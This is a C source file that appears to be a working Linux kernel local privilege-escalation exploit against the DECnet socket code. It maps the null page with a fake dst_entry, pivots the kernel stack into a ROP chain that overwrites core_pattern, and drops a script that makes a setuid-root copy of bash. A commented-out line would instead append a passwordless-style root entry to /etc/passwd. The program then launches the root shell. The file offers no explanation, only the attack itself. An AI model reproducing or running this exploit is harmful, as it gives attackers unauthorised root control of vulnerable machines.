#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include "dn.h"
#include "dnetdb.h"

#define MAP_ANONYMOUS	0x20

struct dst_entry {
    unsigned char       *dev;
    unsigned long       ops;
    unsigned long       _metrics;
    unsigned long       expires;
    unsigned long       __pad1;
    void                (* input)();
    unsigned long       output;
};

void pop() {
    puts("[*] Returned to userland, crashing again...");
    kill(getpid(), SIGABRT);
}

unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long user_rip = (unsigned long) pop;

static void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
    puts("[*] Saved state");
}

void input() {
    unsigned char a[3] = {0x68, 0x75, 0x68}; 
}

unsigned long chain[16] = {
    0xffffffff81cbf100,     // pop rax; ret
    0x78782f706d742f7c,     // |/tmp/xx
    0xffffffff81aa093d,     // pop rdi; ret
    0xffffffff82d64ba0,     // core_pattern
    0xffffffff814a5d64,     // mov QWORD PTR [rdi], rax; ret
    0xffffffff81e00df0 + 121,   // swapgs_restore_regs_and_return_to_usermode + 121 -> KPTI trampoline
    0x13,
    0x37
};

void pwn() {
    struct sockaddr_dn sockaddr;
    int sockfd;

    // must be root to set local addr
    // echo -n "1.10" > /proc/sys/net/decnet/node_address
    char addrname[5] = "1.10";
    FILE *fp = fopen("/proc/sys/net/decnet/node_address", "w");
    if (fp == NULL) {
        puts("[*] Running as non-root");
    } else {
        fprintf(fp, "%s", addrname);
        fclose(fp);
    }
    struct dst_entry *null_page = (struct dst_entry *) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (null_page == MAP_FAILED) {
        perror("[!] mmap");
        exit(-1);
    }
    void *stack = (void *) mmap((void *) 0x5b000000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    unsigned long *ropstack = (unsigned long *) (stack + 0x1fe);
    for (int i = 0; i < 11; i++) {
        ropstack[i] = chain[i];
    }

    unsigned char *dev = (unsigned char *) malloc(0x8c0);  // sizeof(net_device)
    if (dev == NULL) {
        perror("[!] malloc");
        exit(-1);
    }
    memset(dev, 0x41, 0x8c0);

    null_page->dev = dev;
    null_page->ops = 0xdeadc0dedeadc0de;
    null_page->_metrics = 0xdeadc0dedeadc0de;
    null_page->expires = 0xdeadc0dedeadc0de;
    null_page->__pad1 = 0xdeadc0dedeadc0de;
    null_page->input = input;

    null_page->output = 0xffffffff815feffb;  // mov esp, 0x5b0001fe; ret    -> stack pivot

    static struct dn_naddr addr;
    struct nodeent dp;
    char *nodename = "turtle";
    addr.a_addr[0] = 10 & 0xFF;
    addr.a_addr[1] = (1 << 2) | ((10 & 0x300) >> 8);
    dp.n_addr = (unsigned char *)&addr.a_addr;
    dp.n_length = 2;
    dp.n_name = nodename;
    dp.n_addrtype = AF_DECnet;

    if ((sockfd = socket(AF_DECnet, SOCK_SEQPACKET, DNPROTO_NSP)) == -1) {
	    perror("[!] socket");
	    exit(-1);
    }

    sockaddr.sdn_family = AF_DECnet;
    sockaddr.sdn_flags  = 0x00;
    sockaddr.sdn_objnum  = DNOBJECT_MIRROR;
    sockaddr.sdn_objnamel  = 0x00;
    memcpy(sockaddr.sdn_add.a_addr, dp.n_addr, 2);

    save_state();
    ropstack[8] = user_rip;
    ropstack[9] = user_cs;
    ropstack[10] = user_rflags;
    ropstack[11] = user_sp;
    ropstack[12] = user_ss;

    puts("[*] Dropping privesc script");
    // system("echo '#!/bin/sh\necho needle:M6Jplzqa7rJp.:0:0:root:/root:/bin/sh >> /etc/passwd' > /tmp/xx\nchmod +x /tmp/xx");
    system("echo '#!/bin/sh\ncp /bin/bash /tmp\nchown root:root /tmp/bash\nchmod +s /tmp/bash' > /tmp/xx\nchmod +x /tmp/xx");

    puts("[*] Triggering NPD");
    if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
        perror("[!] socket");
        exit(-1);
    }

    puts("[!] Shouldn't get here");
}

int main() {
    pid_t pid = fork();
    if (pid == -1) {
        perror("[!] fork");
        exit(-1);
    } else if (pid == 0) {
        pwn();
    } else {
        sleep(3);
        execl("/tmp/bash", "bash", "-p", (char *)0);
        perror("[!] execl");
    }
    return 0;
}
